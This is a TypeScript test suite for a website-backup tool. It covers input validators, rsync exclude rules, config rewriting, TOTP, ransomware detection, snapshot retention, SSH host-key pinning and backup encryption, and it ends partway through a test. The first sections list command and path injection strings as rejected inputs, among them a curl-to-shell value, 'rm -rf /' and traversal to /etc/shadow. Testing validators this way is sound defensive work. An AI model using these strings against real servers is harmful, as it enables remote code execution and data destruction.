import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, before, describe, it } from 'node:test';

import { sanitizeErrorMessage } from '@/lib/api-error';
import { getDb, resetDbConnectionForTests, setSettings } from '@/lib/db';
import { evaluateBackupAnomaly } from '@/lib/engine/anomaly-detector';
import {
  applyConfigReplacements,
  patchRestoredWebConfigOverSsh,
} from '@/lib/engine/config-rewriter';
import {
  parseSafeExcludePatterns,
  validateExcludePatternsInput,
} from '@/lib/engine/exclude-rules';
import {
  buildMorningDigestSummary,
  captureDailyStorageSnapshot,
  getStorageHistory30Days,
  getTopLargestDomains,
} from '@/lib/engine/morning-digest';
import { applyGfsRetentionForServer } from '@/lib/engine/retention-gfs';
import { parseRsyncStats } from '@/lib/engine/rsync-runner';
import {
  assertSafe,
  isSafeDbName,
  isSafeDomain,
  isSafeHostAddress,
  isSafeSnapshotName,
  isSafeSystemUser,
  isSafeWebroot,
  isValidPanelType,
  validateServerConnectionFields,
} from '@/lib/engine/safe-names';
import { getPanelAdapter } from '@/lib/engine/adapters';
import { executeBackupJob } from '@/lib/engine/backup-worker';
import { syncExtendedHostingExtras } from '@/lib/engine/extended-hosting-backup';
import {
  buildAwsSigV4Headers,
  createGoogleServiceAccountJwt,
  normalizeGoogleDriveFolderId,
  pushSnapshotToOffsiteCloud,
  testOffsiteConnection,
} from '@/lib/engine/offsite-cloud';
import {
  createOffsiteDecryptStream,
  createOffsiteEncryptStream,
} from '@/lib/engine/offsite-crypto';
import { verifyPostgresDumpFile } from '@/lib/engine/sandbox-verifier';
import { encodeQrMatrix, renderQrSvg } from '@/lib/qr-svg';
import {
  buildRsyncSshTransport,
  buildSshBaseArgs,
  computeOpenSshKeyFingerprint,
  ensureServerHostKeyPinned,
  materializeServerKnownHostsFile,
} from '@/lib/ssh';
import {
  buildOtpAuthUrl,
  countRemainingRecoveryCodes,
  decodeBase32,
  encryptTotpSecret,
  decryptTotpSecret,
  encodeBase32,
  generateRecoveryCodes,
  generateTotpCode,
  generateTotpSecret,
  verifyAndConsumeRecoveryCode,
  verifyTotpCode,
} from '@/lib/totp';
import type { ServerRecord } from '@/types';

let tempRootDir = '';

before(() => {
  tempRootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'nas-sync-v140-tests-'));
  process.env.DATA_DIR = path.join(tempRootDir, 'data');
  process.env.SSH_KEYS_DIR = path.join(tempRootDir, 'ssh_keys');
  process.env.STORAGE_VOLUMES = [
    path.join(tempRootDir, 'volumes', 'vol1'),
    path.join(tempRootDir, 'volumes', 'vol2'),
  ].join(',');
  process.env.VOLUME_MIN_FREE_GB = '0';
  process.env.VOLUME_MAX_USAGE_PERCENT = '99';
  process.env.SEED_DEMO = 'false';
  process.env.JWT_SECRET =
    'test-jwt-secret-key-for-nas-sync-v140-automated-suite-256bit';
  resetDbConnectionForTests();
});

after(() => {
  resetDbConnectionForTests();
  if (tempRootDir && fs.existsSync(tempRootDir)) {
    fs.rmSync(tempRootDir, { recursive: true, force: true });
  }
});

describe('1. safe-names validation & shell/path injection blocking', () => {
  it('accepts valid hosting identifiers and rejects command/path injection payloads', () => {
    assert.equal(isSafeDomain('portal.vn'), true);
    assert.equal(isSafeDomain('sub-01.xn--fiqs8s.example.com'), true);
    assert.equal(isSafeDomain('../etc/passwd'), false);
    assert.equal(isSafeDomain('-oProxyCommand=id'), false);
    assert.equal(isSafeDomain('site.com;rm -rf /'), false);

    assert.equal(isSafeSystemUser('da_user01'), true);
    assert.equal(isSafeSystemUser('-root'), false);
    assert.equal(isSafeSystemUser('.ssh'), false);
    assert.equal(isSafeSystemUser('user..escape'), false);
    assert.equal(isSafeSystemUser('user$(whoami)'), false);

    assert.equal(isSafeDbName('cpuser_wp2026'), true);
    assert.equal(isSafeDbName('cpuser_$(curl evil|sh)'), false);
    assert.equal(isSafeDbName('-mysql_opt'), false);
    assert.equal(isSafeDbName('db;DROP TABLE users'), false);

    assert.equal(isSafeHostAddress('103.221.220.15'), true);
    assert.equal(isSafeHostAddress('2001:db8::1'), true);
    assert.equal(isSafeHostAddress('-oProxyCommand=sh'), false);

    assert.equal(isSafeSnapshotName('2026-11-02_01-00'), true);
    assert.equal(isSafeSnapshotName('../2026-11-02'), false);
  });

  it('enforces minimum depth and POSIX traversal safety on webroot paths', () => {
    assert.equal(
      isSafeWebroot('/home/user01/domains/example.com/public_html'),
      true
    );
    assert.equal(isSafeWebroot('/var/www/site01'), true);

    assert.equal(isSafeWebroot('/'), false);
    assert.equal(isSafeWebroot('/home'), false);
    assert.equal(isSafeWebroot('/home/user01'), false);
    assert.equal(isSafeWebroot('/home/user01/../etc/shadow'), false);
    assert.equal(isSafeWebroot('/var/www/site;id'), false);

    assert.throws(() => assertSafe(isSafeWebroot, '/etc', 'Webroot'));
  });

  it('validates full server connection payloads strictly', () => {
    assert.equal(
      validateServerConnectionFields({
        hostname: 'vps-prod-01.example.com',
        ipAddress: '103.221.220.88',
        sshUser: 'root',
        panelType: 'DIRECTADMIN',
        sshPort: 2222,
        bwLimitKbps: 25600,
      }),
      null
    );

    assert.notEqual(
      validateServerConnectionFields({
        hostname: '-bad-host',
        ipAddress: '103.221.220.88',
        sshUser: 'root',
      }),
      null
    );

    assert.notEqual(
      validateServerConnectionFields({
        hostname: 'vps01.example.com',
        ipAddress: '103.221.220.88',
        sshUser: 'root',
        sshPort: 70000,
      }),
      null
    );
  });
});

describe('2. exclude-rules merging & --option injection defense', () => {
  it('merges global and server exclude blocks while filtering comments and unsafe options', () => {
    const merged = parseSafeExcludePatterns(
      '# Global rules\nwp-content/cache/\n*.log\n--rsh=sh -c id\n/',
      'wp-content/updraft/\n*.log\n../secret\nstorage/logs/*.log'
    );

    assert.deepEqual(merged, [
      'wp-content/cache/',
      '*.log',
      'wp-content/updraft/',
      'storage/logs/*.log',
    ]);
  });

  it('blocks rsync flag injection, parent traversal, and wildcard root patterns in UI validator', () => {
    const okRes = validateExcludePatternsInput(
      '# Cache WordPress\nwp-content/cache/\nerror_log\nwp-content/cache/'
    );
    assert.equal(okRes.ok, true);
    assert.equal(okRes.normalized, '# Cache WordPress\nwp-content/cache/\nerror_log');

    for (const bad of [
      '--rsync-path=evil',
      '-e ssh',
      '/',
      '**',
      '/*',
      'wp-content/../../etc/passwd',
      'bad\0null',
    ]) {
      const check = validateExcludePatternsInput(bad);
      assert.equal(check.ok, false, `Expected pattern "${bad}" to be rejected`);
    }
  });
});

describe('3. config-rewriter (wp-config.php, .env, configuration.php)', () => {
  it('rewrites DB names and webroot paths accurately across CMS config formats', () => {
    const wpRaw = `<?php\ndefine('DB_NAME', 'dauser_wpold');\ndefine( "DB_USER", "dauser" );\ndefine('WP_CONTENT_DIR', '/home/dauser/domains/shop.vn/public_html/wp-content');\n`;
    const wpPatched = applyConfigReplacements('wp-config.php', wpRaw, {
      changedDbs: [['dauser_wpold', 'cpuser_wpnew']],
      sourceWebroot: '/home/dauser/domains/shop.vn/public_html',
      targetWebroot: '/home/cpuser/public_html',
    });
    assert.match(wpPatched, /define\('DB_NAME', 'cpuser_wpnew'\)/);
    assert.match(wpPatched, /\/home\/cpuser\/public_html\/wp-content/);

    const envRaw = `APP_NAME=Shop\nDB_HOST=127.0.0.1\nDB_DATABASE="laravel_old"\nexport DB_DATABASE=laravel_old\n`;
    const envPatched = applyConfigReplacements('.env', envRaw, {
      changedDbs: [['laravel_old', 'plesk_laravel_new']],
    });
    assert.match(envPatched, /DB_DATABASE="plesk_laravel_new"/);
    assert.match(envPatched, /export DB_DATABASE=plesk_laravel_new/);

    const joomlaRaw = `<?php\nclass JConfig {\n  public $user = 'juser';\n  public $db = 'joomla_old';\n}\n`;
    const joomlaPatched = applyConfigReplacements(
      'configuration.php',
      joomlaRaw,
      {
        changedDbs: [['joomla_old', 'joomla_migrated']],
      }
    );
    assert.match(joomlaPatched, /public \$db = 'joomla_migrated';/);
  });

  it('atomically patches mock webroot config files and preserves .nas-sync.bak backup', async () => {
    const mockWebroot = path.join(tempRootDir, 'mock_restore_webroot');
    fs.mkdirSync(mockWebroot, { recursive: true });
    const wpFile = path.join(mockWebroot, 'wp-config.php');
    fs.writeFileSync(
      wpFile,
      `<?php\ndefine('DB_NAME', 'src_db');\n`,
      'utf8'
    );

    const mockServer = {
      id: 999,
      hostname: 'mock-target.local',
      ip_address: '127.0.0.1',
      ssh_port: 22,
      ssh_user: 'root',
      ssh_key_path: '',
      panel_type: 'CPANEL',
      assigned_volume_id: null,
      bw_limit_kbps: 0,
      status: 'ONLINE',
      is_mock: 1,
      last_connected_at: null,
      notes: '',
      created_at: new Date().toISOString(),
    } satisfies ServerRecord;

    const res = await patchRestoredWebConfigOverSsh({
      server: mockServer,
      targetUser: 'cpuser',
      targetDomain: 'shop.vn',
      targetWebroot: '/home/cpuser/public_html',
      sourceWebroot: '/home/dauser/domains/shop.vn/public_html',
      dbRenameMap: { src_db: 'dst_db' },
      isMock: true,
      mockWebrootDir: mockWebroot,
      onLog: () => {},
    });

    assert.deepEqual(res.patchedFiles, ['wp-config.php']);
    assert.match(fs.readFileSync(wpFile, 'utf8'), /dst_db/);
    assert.match(fs.readFileSync(`${wpFile}.nas-sync.bak`, 'utf8'), /src_db/);
  });
});

describe('4. totp + qr-svg RFC 6238 verification, recovery codes, QR matrix', () => {
  it('generates and verifies RFC 6238 TOTP codes with +-1 step window and encrypts secrets', () => {
    const rawBuf = Buffer.from('12345678901234567890', 'ascii');
    const b32 = encodeBase32(rawBuf);
    assert.deepEqual(decodeBase32(b32), rawBuf);

    // RFC 6238 Appendix B test vector for SHA1 at T = 59s -> 287082 (8 digits -> 7082 mod 10^6 = 287082)
    assert.equal(generateTotpCode(b32, 59_000), '287082');

    const secret = generateTotpSecret();
    const fixedNow = 1_762_000_000_000;
    const currentCode = generateTotpCode(secret, fixedNow);
    const prevWindowCode = generateTotpCode(secret, fixedNow - 30_000);
    const expiredCode = generateTotpCode(secret, fixedNow - 120_000);

    assert.equal(verifyTotpCode(secret, currentCode, fixedNow), true);
    assert.equal(verifyTotpCode(secret, prevWindowCode, fixedNow), true);
    assert.equal(verifyTotpCode(secret, expiredCode, fixedNow), false);
    assert.equal(verifyTotpCode(secret, '000000', fixedNow) && currentCode !== '000000', false);

    const encrypted = encryptTotpSecret(secret);
    assert.ok(encrypted.startsWith('v1:'));
    assert.equal(decryptTotpSecret(encrypted), secret);
  });

  it('consumes single-use 2FA recovery codes and renders valid ISO 18004 QR SVG', () => {
    const { plainCodes, hashedJson } = generateRecoveryCodes(6);
    assert.equal(plainCodes.length, 6);
    assert.equal(countRemainingRecoveryCodes(hashedJson), 6);

    const firstUse = verifyAndConsumeRecoveryCode(plainCodes[0], hashedJson);
    assert.equal(firstUse.matched, true);
    assert.equal(firstUse.remainingCount, 5);

    const replayUse = verifyAndConsumeRecoveryCode(
      plainCodes[0],
      firstUse.remainingJson
    );
    assert.equal(replayUse.matched, false);
    assert.equal(replayUse.remainingCount, 5);

    const otpUrl = buildOtpAuthUrl('admin', generateTotpSecret(), 'NAS-Sync');
    const matrix = encodeQrMatrix(otpUrl, 'M');
    assert.equal(matrix.size, matrix.version * 4 + 17);
    assert.equal(matrix.modules.length, matrix.size * matrix.size);
    // Top-left finder corner (0,0) must be dark (1)
    assert.equal(matrix.modules[0], 1);

    const svg = renderQrSvg(otpUrl, { width: 200, margin: 1 });
    assert.ok(svg.startsWith('<svg xmlns="http://www.w3.org/2000/svg"'));
    assert.ok(svg.includes('<path fill='));
  });
});

describe('5. anomaly-detector & retention-gfs GFS bucket retention', () => {
  it('detects ransomware file spike anomalies and auto-pins clean historical snapshots', async () => {
    const db = getDb();
    setSettings({
      anomaly_max_changed_percent: '50',
      anomaly_max_delta_gb: '10',
    });

    const vol = db
      .prepare('SELECT id, mount_path FROM storage_volumes ORDER BY id ASC LIMIT 1')
      .get() as { id: number; mount_path: string };
    assert.ok(
      vol.mount_path.startsWith(tempRootDir),
      'Test storage volume must be isolated inside tempRootDir on both Linux and Windows'
    );

    const srvRes = db
      .prepare(
        `INSERT INTO servers (hostname, ip_address, ssh_port, ssh_user, panel_type, assigned_volume_id, is_mock)
         VALUES ('anomaly-vps.example.com', '103.221.220.201', 22, 'root', 'DIRECTADMIN', ?, 1)`
      )
      .run(vol.id);
    const serverId = Number(srvRes.lastInsertRowid);
    const server = db
      .prepare('SELECT * FROM servers WHERE id = ?')
      .get(serverId) as unknown as ServerRecord;

    const cleanJobRes = db
      .prepare(
        `INSERT INTO backup_jobs (job_type, server_id, volume_id, snapshot_name, status, is_pinned, anomaly_detected)
         VALUES ('BACKUP', ?, ?, '2026-10-30_01-00', 'COMPLETED', 0, 0)`
      )
      .run(serverId, vol.id);
    const cleanJobId = Number(cleanJobRes.lastInsertRowid);

    const spikeJobRes = db
      .prepare(
        `INSERT INTO backup_jobs (job_type, server_id, volume_id, snapshot_name, status, is_pinned, anomaly_detected)
         VALUES ('BACKUP', ?, ?, '2026-10-31_01-00', 'COMPLETED', 0, 0)`
      )
      .run(serverId, vol.id);
    const spikeJobId = Number(spikeJobRes.lastInsertRowid);

    // First backup never triggers false-positive anomaly
    const firstCheck = await evaluateBackupAnomaly({
      jobId: cleanJobId,
      server,
      filesTotal: 500,
      filesChanged: 500,
      deltaSizeBytes: 500 * 1024 * 1024,
      isFirstBackup: true,
      onLog: () => {},
    });
    assert.equal(firstCheck.anomalyDetected, false);

    // Subsequent backup with 90% files changed triggers ransomware guard & pins cleanJobId
    const anomalyCheck = await evaluateBackupAnomaly({
      jobId: spikeJobId,
      server,
      filesTotal: 1000,
      filesChanged: 900,
      deltaSizeBytes: 512 * 1024 * 1024,
      isFirstBackup: false,
      onLog: () => {},
    });
    assert.equal(anomalyCheck.anomalyDetected, true);
    assert.equal(anomalyCheck.pinnedPreviousCount, 1);

    const cleanAfter = db
      .prepare('SELECT is_pinned FROM backup_jobs WHERE id = ?')
      .get(cleanJobId);
    assert.equal(Number(cleanAfter?.is_pinned), 1);
  });

  it('retains GFS daily/weekly/monthly + pinned snapshots and prunes expired intra-day snapshots', async () => {
    const db = getDb();
    const vol = db
      .prepare('SELECT id, mount_path FROM storage_volumes ORDER BY id ASC LIMIT 1')
      .get() as { id: number; mount_path: string };
    assert.ok(
      vol.mount_path.startsWith(tempRootDir),
      'Test storage volume must be isolated inside tempRootDir on both Linux and Windows'
    );

    const srvRes = db
      .prepare(
        `INSERT INTO servers (hostname, ip_address, ssh_port, ssh_user, panel_type, assigned_volume_id, is_mock)
         VALUES ('gfs-vps.example.com', '103.221.220.202', 22, 'root', 'CPANEL', ?, 1)`
      )
      .run(vol.id);
    const serverId = Number(srvRes.lastInsertRowid);
    const hostDir = path.join(vol.mount_path, 'gfs-vps.example.com');
    fs.mkdirSync(hostDir, { recursive: true });

    const snapshots = [
      // Same day (2026-10-25): 2 snapshots -> newest kept as Latest/Daily, older intra-day pruned
      { name: '2026-10-25_14-00', createdAt: '2026-10-25 14:00:00', pinned: 0 },
      { name: '2026-10-25_02-00', createdAt: '2026-10-25 02:00:00', pinned: 0 },
      // Previous days
      { name: '2026-10-24_01-00', createdAt: '2026-10-24 01:00:00', pinned: 0 },
      { name: '2026-10-23_01-00', createdAt: '2026-10-23 01:00:00', pinned: 0 },
      // Older snapshot outside daily=2, weekly=1, monthly=1 that IS pinned -> must survive
      { name: '2026-08-10_01-00', createdAt: '2026-08-10 01:00:00', pinned: 1 },
      // Older unpinned snapshot in July -> must be pruned when monthly=1
      { name: '2026-07-15_01-00', createdAt: '2026-07-15 01:00:00', pinned: 0 },
    ];

    for (const s of snapshots) {
      const snapDir = path.join(hostDir, s.name);
      fs.mkdirSync(snapDir, { recursive: true });
      fs.writeFileSync(path.join(snapDir, 'marker.txt'), s.name, 'utf8');
      db.prepare(
        `INSERT INTO backup_jobs (job_type, server_id, volume_id, snapshot_name, status, is_pinned, created_at, completed_at)
         VALUES ('BACKUP', ?, ?, ?, 'COMPLETED', ?, ?, ?)`
      ).run(serverId, vol.id, s.name, s.pinned, s.createdAt, s.createdAt);
    }

    const res = await applyGfsRetentionForServer(
      serverId,
      { daily: 2, weekly: 1, monthly: 1 },
      false
    );

    const keptNames = new Set(res.keptSnapshots.map((k) => k.snapshotName));
    assert.ok(keptNames.has('2026-10-25_14-00'), 'Newest snapshot must be kept');
    assert.ok(keptNames.has('2026-10-24_01-00'), 'Second daily bucket must be kept');
    assert.ok(keptNames.has('2026-08-10_01-00'), 'Pinned snapshot must be kept');

    assert.ok(
      res.deletedSnapshots.includes('2026-10-25_02-00'),
      'Redundant same-day snapshot should be pruned'
    );
    assert.ok(
      res.deletedSnapshots.includes('2026-07-15_01-00'),
      'Expired unpinned historical snapshot should be pruned'
    );
    assert.equal(
      fs.existsSync(path.join(hostDir, '2026-07-15_01-00')),
      false
    );
  });
});

describe('6. SSH TOFU Host Key pinning, API sanitizer & Morning Digest / Top Domains', () => {
  it('computes RFC 4253 OpenSSH SHA-256 fingerprints and enforces TOFU + MITM lockdown', async () => {
    const rawKeyA = crypto.randomBytes(51).toString('base64');
    const rawKeyB = crypto.randomBytes(51).toString('base64');
    const expectedDigestA = crypto
      .createHash('sha256')
      .update(Buffer.from(rawKeyA, 'base64'))
      .digest('base64')
      .replace(/=+$/, '');

    const scanLineA = `[103.221.220.210]:2222 ssh-ed25519 ${rawKeyA}`;
    const scanLineB = `[103.221.220.210]:2222 ssh-ed25519 ${rawKeyB}`;

    const fpA = computeOpenSshKeyFingerprint(scanLineA);
    assert.equal(fpA, `SHA256:${expectedDigestA} (SSH-ED25519)`);
    assert.throws(() => computeOpenSshKeyFingerprint('# comment line'));

    const db = getDb();
    const ins = db
      .prepare(
        `INSERT INTO servers (hostname, ip_address, ssh_port, ssh_user, panel_type, is_mock)
         VALUES ('tofu-vps.example.com', '103.221.220.210', 2222, 'root', 'DIRECTADMIN', 0)`
      )
      .run();
    const serverId = Number(ins.lastInsertRowid);

    // 1. Before pinning: StrictHostKeyChecking=accept-new
    const unpinnedSrv = db
      .prepare('SELECT * FROM servers WHERE id = ?')
      .get(serverId) as unknown as ServerRecord;
    assert.equal(unpinnedSrv.host_key_status, 'UNPINNED');
    assert.equal(materializeServerKnownHostsFile(unpinnedSrv), null);
    assert.ok(
      buildSshBaseArgs(unpinnedSrv).includes('StrictHostKeyChecking=accept-new')
    );

    // 2. First connection: TOFU pins key A -> VERIFIED + StrictHostKeyChecking=yes
    const firstPin = await ensureServerHostKeyPinned(
      serverId,
      `# [103.221.220.210]:2222 SSH-2.0-OpenSSH_9.6\n${scanLineA}\n`
    );
    assert.equal(firstPin.status, 'VERIFIED');
    assert.equal(firstPin.fingerprint, fpA);

    const verifiedSrv = db
      .prepare('SELECT * FROM servers WHERE id = ?')
      .get(serverId) as unknown as ServerRecord;
    const khFile = materializeServerKnownHostsFile(verifiedSrv);
    assert.ok(khFile && fs.existsSync(khFile));
    const sshArgsVerified = buildSshBaseArgs(verifiedSrv);
    assert.ok(sshArgsVerified.includes('StrictHostKeyChecking=yes'));
    assert.ok(
      buildRsyncSshTransport(verifiedSrv).includes('StrictHostKeyChecking=yes')
    );

    // 3. Repeat connection with matching key A: stays VERIFIED
    const secondPin = await ensureServerHostKeyPinned(serverId, scanLineA);
    assert.equal(secondPin.status, 'VERIFIED');

    // 4. Unexpected host key change (Key B) -> MISMATCH lockdown + CRITICAL alert!
    await assert.rejects(
      () => ensureServerHostKeyPinned(serverId, scanLineB),
      /\[SECURITY\]/
    );

    const mismatchSrv = db
      .prepare('SELECT * FROM servers WHERE id = ?')
      .get(serverId) as unknown as ServerRecord;
    assert.equal(mismatchSrv.host_key_status, 'MISMATCH');
    assert.equal(mismatchSrv.status, 'ERROR');
    assert.equal(
      mismatchSrv.host_key_pending_fingerprint,
      computeOpenSshKeyFingerprint(scanLineB)
    );

    // SSH & Rsync builders must immediately block MISMATCH server
    assert.throws(() => buildSshBaseArgs(mismatchSrv), /\[SECURITY\]/);
    assert.throws(() => buildRsyncSshTransport(mismatchSrv), /\[SECURITY\]/);
  });

  it('redacts internal filesystem paths and stack traces in sanitizeErrorMessage while keeping Vietnamese errors', () => {
    const domainErr = new Error(
      'Hostname không hợp lệ (không được bắt đầu bằng dấu gạch ngang).'
    );
    assert.equal(
      sanitizeErrorMessage(domainErr),
      'Hostname không hợp lệ (không được bắt đầu bằng dấu gạch ngang).'
    );

    const pathLeakErr = new Error(
      'ENOENT: Không đọc được khóa tại /root/.ssh/id_ed25519 hoặc /volume1/VPS_Backups/secret và D:\\W2W\\app_data\\nas-sync.db\n    at Object.openSync (node:fs:581:3)\n    at test (/app/src/lib/ssh.ts:90:12)'
    );
    const cleaned = sanitizeErrorMessage(pathLeakErr);
    assert.equal(cleaned.includes('/root/.ssh'), false);
    assert.equal(cleaned.includes('/volume1/VPS_Backups'), false);
    assert.equal(cleaned.includes('D:\\W2W'), false);
    assert.equal(cleaned.includes('node:fs'), false);
    assert.ok(cleaned.includes('[redacted-path]'));

    const rawSqliteErr = new Error(
      'SQLITE_ERROR: near "FROM": syntax error in StatementSync'
    );
    assert.equal(
      sanitizeErrorMessage(rawSqliteErr, 'Lỗi truy vấn nội bộ.'),
      'Lỗi truy vấn nội bộ.'
    );
  });

  it('captures 30-day storage snapshots, parses rsync stats, and ranks Top Largest Domains accurately', () => {
    const parsedStats = parseRsyncStats(`
Number of files: 14,250 (reg: 12,800, dir: 1,450)
Number of regular files transferred: 312
Total file size: 2,147,483,648 bytes
Total transferred file size: 52,428,800 bytes
`);
    assert.deepEqual(parsedStats, {
      filesTotal: 14250,
      filesChanged: 312,
      totalBytes: 2147483648,
      deltaBytes: 52428800,
    });

    const db = getDb();
    const vol = db
      .prepare('SELECT id FROM storage_volumes ORDER BY id ASC LIMIT 1')
      .get() as { id: number };
    db.prepare(
      'UPDATE storage_volumes SET used_bytes = ?, total_bytes = ?, free_bytes = ? WHERE id = ?'
    ).run(120 * 1024 ** 3, 500 * 1024 ** 3, 380 * 1024 ** 3, vol.id);

    const srvRes = db
      .prepare(
        `INSERT INTO servers (hostname, ip_address, ssh_port, ssh_user, panel_type, assigned_volume_id, is_mock)
         VALUES ('digest-vps.example.com', '103.221.220.220', 22, 'root', 'PLESK', ?, 1)`
      )
      .run(vol.id);
    const serverId = Number(srvRes.lastInsertRowid);

    const jobRes = db
      .prepare(
        `INSERT INTO backup_jobs
         (job_type, server_id, volume_id, snapshot_name, status, total_size_bytes, delta_size_bytes, created_at, completed_at)
         VALUES ('BACKUP', ?, ?, '2026-11-02_06-00', 'COMPLETED', ?, ?, datetime('now'), datetime('now'))`
      )
      .run(serverId, vol.id, 10 * 1024 ** 3, 1 * 1024 ** 3);
    const jobId = Number(jobRes.lastInsertRowid);

    db.prepare(
      `INSERT INTO backup_items
       (job_id, server_id, volume_id, snapshot_name, system_user, domain_name, webroot_backed_up, webroot_size_bytes, databases_list, verification_status)
       VALUES (?, ?, ?, '2026-11-02_06-00', 'plesk_u1', 'mega-ecommerce.vn', 1, ?, ?, 'PASSED')`
    ).run(
      jobId,
      serverId,
      vol.id,
      6 * 1024 ** 3,
      JSON.stringify([
        {
          name: 'ecom_prod',
          file: 'ecom_prod.sql.zst',
          size_bytes: 2 * 1024 ** 3,
          verified: true,
        },
      ])
    );

    db.prepare(
      `INSERT INTO backup_items
       (job_id, server_id, volume_id, snapshot_name, system_user, domain_name, webroot_backed_up, webroot_size_bytes, databases_list, verification_status)
       VALUES (?, ?, ?, '2026-11-02_06-00', 'plesk_u2', 'landing-blog.vn', 1, ?, ?, 'PASSED')`
    ).run(
      jobId,
      serverId,
      vol.id,
      200 * 1024 ** 2,
      JSON.stringify([
        {
          name: 'blog_db',
          file: 'blog_db.sql.zst',
          size_bytes: 50 * 1024 ** 2,
          verified: true,
        },
      ])
    );

    const snap = captureDailyStorageSnapshot();
    assert.ok(snap.logical_bytes >= 10 * 1024 ** 3);
    assert.ok(snap.verified_dbs_count >= 2);

    const history = getStorageHistory30Days();
    assert.ok(history.length >= 1);
    assert.equal(history[history.length - 1].stat_date, snap.stat_date);

    const topDomains = getTopLargestDomains(5);
    assert.ok(topDomains.length >= 2);
    assert.equal(topDomains[0].domain_name, 'mega-ecommerce.vn');
    assert.equal(topDomains[0].total_domain_bytes, 8 * 1024 ** 3);
    assert.equal(topDomains[0].databases_count, 1);

    const digestSummary = buildMorningDigestSummary();
    assert.ok(digestSummary.hostKeyMismatchCount >= 1); // from tofu-vps test above
    assert.ok(digestSummary.savingsPercent > 0);
    assert.ok(digestSummary.verifiedDbs24h >= 2);
  });
});

describe('7. v1.5.0 Offsite AES-256-GCM Crypto, Cloud SigV4/GDrive JWT, New Panels, Extended Extras & PostgreSQL', () => {
  it('encrypts & decrypts multi-chunk NASSYNC1 AES-256-GCM streams and rejects bit-flip / truncated EOF / wrong passphrase', async () => {
    const { Readable } = await import('node:stream');
    const { pipeline } = await import('node:stream/promises');
    const { execFileSync } = await import('node:child_process');

    // Tạo dữ liệu 11.5 KiB chia qua nhiều chunk nhỏ 2048 bytes (6 frames + 1 EOF frame)
    const plainOriginal = crypto.randomBytes(11_777);
    const pass = 'Strong-Offsite-Passphrase-2026!';

    const encChunks: Buffer[] = [];
    const encStream = createOffsiteEncryptStream(pass, 2048);
    encStream.on('data', (c: Buffer) => encChunks.push(c));
    await pipeline(
      Readable.from([
        plainOriginal.subarray(0, 1500),
        plainOriginal.subarray(1500, 6100),
        plainOriginal.subarray(6100),
      ]),
      encStream
    );

    const encryptedBlob = Buffer.concat(encChunks);
    assert.equal(encryptedBlob.subarray(0, 8).toString('ascii'), 'NASSYNC1');
    assert.equal(encryptedBlob[8], 0x01);
    assert.equal(encryptedBlob.readUInt32BE(41), 2048);

    // 1. Giải mã hợp lệ qua luồng bị cắt lẻ ngẫu nhiên -> khớp 100% byte-for-byte
    const decChunks: Buffer[] = [];
    const decStream = createOffsiteDecryptStream(pass);
    decStream.on('data', (c: Buffer) => decChunks.push(c));
    await pipeline(
      Readable.from([
        encryptedBlob.subarray(0, 17),
        encryptedBlob.subarray(17, 45),
        encryptedBlob.subarray(45, 3100),
        encryptedBlob.subarray(3100),
      ]),
      decStream
    );
    assert.deepEqual(Buffer.concat(decChunks), plainOriginal);

    // 2. Kiểm tra standalone CLI `scripts/decrypt-offsite-backup.mjs`
    const encFile = path.join(tempRootDir, 'test-archive.tar.gz.enc');
    const outDecFile = path.join(tempRootDir, 'test-archive.tar.gz');
    fs.writeFileSync(encFile, encryptedBlob);
    execFileSync(
      process.execPath,
      [
        path.resolve(process.cwd(), 'scripts/decrypt-offsite-backup.mjs'),
        encFile,
        outDecFile,
        pass,
      ],
      { stdio: 'pipe' }
    );
    assert.deepEqual(fs.readFileSync(outDecFile), plainOriginal);

    // 3. Đảo 1 bit trong vùng ciphertext -> bắt buộc ném lỗi xác thực AES-256-GCM
    const tampered = Buffer.from(encryptedBlob);
    tampered[90] ^= 0xff;
    await assert.rejects(async () => {
      const s = createOffsiteDecryptStream(pass);
      s.resume();
      await pipeline(Readable.from([tampered]), s);
    }, /Giải mã|Xác thực/i);

    // 4. Cắt cụt mất khung xác thực kết thúc EOF -> bắt buộc ném lỗi cắt cụt luồng
    const truncated = encryptedBlob.subarray(0, encryptedBlob.length - 8);
    await assert.rejects(async () => {
      const s = createOffsiteDecryptStream(pass);
      s.resume();
      await pipeline(Readable.from([truncated]), s);
    }, /cắt cụt|EOF/i);

    // 5. Sai mật khẩu -> bắt buộc từ chối giải mã
    await assert.rejects(async () => {
      const s = createOffsiteDecryptStream('Wrong-Passphrase-999');
      s.resume();
      await pipeline(Readable.from([encryptedBlob]), s);
    }, /Sai mật khẩu|thất bại/i);
  });

  it('computes deterministic AWS SigV4 signatures, normalizes Google Drive folder URLs, and signs valid RS256 Service Account JWTs', () => {
    // 1. AWS Signature Version 4 official RFC / AWS docs test vector (GET examplebucket)
    const fixedDate = new Date('2013-05-24T00:00:00.000Z');
    const emptySha256 =
      'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
    const sigRes = buildAwsSigV4Headers({
      method: 'GET',
      url: 'https://examplebucket.s3.amazonaws.com/test.txt',
      accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
      secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      region: 'us-east-1',
      service: 's3',
      headers: {
        range: 'bytes=0-9',
      },
      payloadHash: emptySha256,
      now: fixedDate,
    });

    assert.equal(sigRes.amzDate, '20130524T000000Z');
    // Official AWS S3 SigV4 documentation signature for GET /test.txt with Range: bytes=0-9 on 20130524T000000Z
    assert.equal(
      sigRes.signature,
      'f0e8bdb87c964420e857bd35b5d6ed310bd44f0170aba48dd91039c6036bdb41'
    );
    assert.match(
      sigRes.authorization,
      /^AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE\/20130524\/us-east-1\/s3\/aws4_request/
    );

    // 2. Google Drive Folder ID extraction from URLs & raw IDs
    assert.equal(
      normalizeGoogleDriveFolderId(
        'https://drive.google.com/drive/folders/1AbCdEfGhIjKlMnOpQrStUvWxYz?usp=sharing'
      ),
      '1AbCdEfGhIjKlMnOpQrStUvWxYz'
    );
    assert.equal(
      normalizeGoogleDriveFolderId(
        'https://drive.google.com/drive/u/1/folders/19_Folder_ID-Test999'
      ),
      '19_Folder_ID-Test999'
    );
    assert.equal(
      normalizeGoogleDriveFolderId('1PlainFolderId_001'),
      '1PlainFolderId_001'
    );
    assert.equal(normalizeGoogleDriveFolderId('   '), '');
    assert.throws(() =>
      normalizeGoogleDriveFolderId("bad' or name contains 'x")
    );

    // 3. Google Cloud Service Account RS256 JWT generation & cryptographic verification
